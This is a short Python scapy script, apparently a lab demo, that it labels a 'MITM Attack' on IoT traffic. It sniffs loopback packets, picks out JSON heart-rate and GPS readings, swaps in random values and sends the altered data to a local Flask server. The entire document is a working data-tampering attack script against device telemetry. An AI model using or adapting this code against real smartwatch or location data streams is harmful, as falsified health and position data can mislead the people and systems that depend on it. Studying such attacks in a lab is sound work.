from scapy.all import sniff, IP, TCP, Raw
import requests
import json
import random  # Ensure random is imported

# Change this to the appropriate interface name on your system
INTERFACE = "\\Device\\NPF_Loopback"

# Define the Flask server endpoint
FLASK_SERVER_URL = "http://127.0.0.1:5000/data"

def process_packet(packet):
    # Process packets that have the layers we're interested in.
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            raw_data = packet[Raw].load.decode(errors="ignore")
            # Attempt to parse the raw data as JSON.
            data_json = json.loads(raw_data)
        except Exception as e:
            print(f"Packet data is not valid JSON: {e}")
            return

        # Check for heart rate data (Smartwatch)
        if "heart_rate" in data_json:
            print(f"Original Smartwatch Data: {data_json}")
            # Modify the heart_rate value (e.g., increase it by choosing a new random value)
            data_json["heart_rate"] = random.randint(100, 150)
            print(f"Modified Smartwatch Data: {data_json}")

            response = requests.post(FLASK_SERVER_URL, json=data_json)
            if response.status_code == 200:
                print("[Smartwatch] Data successfully sent to Flask server")
            else:
                print(f"[Smartwatch] Failed to send data: {response.status_code}")

        # Check for GPS data with both latitude and longitude
        elif "latitude" in data_json and "longitude" in data_json:
            print(f"Original GPS Data: {data_json}")
            # Modify GPS coordinates with new random values within a specific range
            data_json["latitude"] = random.uniform(10, 50)
            data_json["longitude"] = random.uniform(10, 50)
            print(f"Modified GPS Data: {data_json}")

            response = requests.post(FLASK_SERVER_URL, json=data_json)
            if response.status_code == 200:
                print("[GPS] Data successfully sent to Flask server")
            else:
                print(f"[GPS] Failed to send data: {response.status_code}")

print("[*] Starting MITM Attack...")
sniff(iface=INTERFACE, prn=process_packet, store=False)
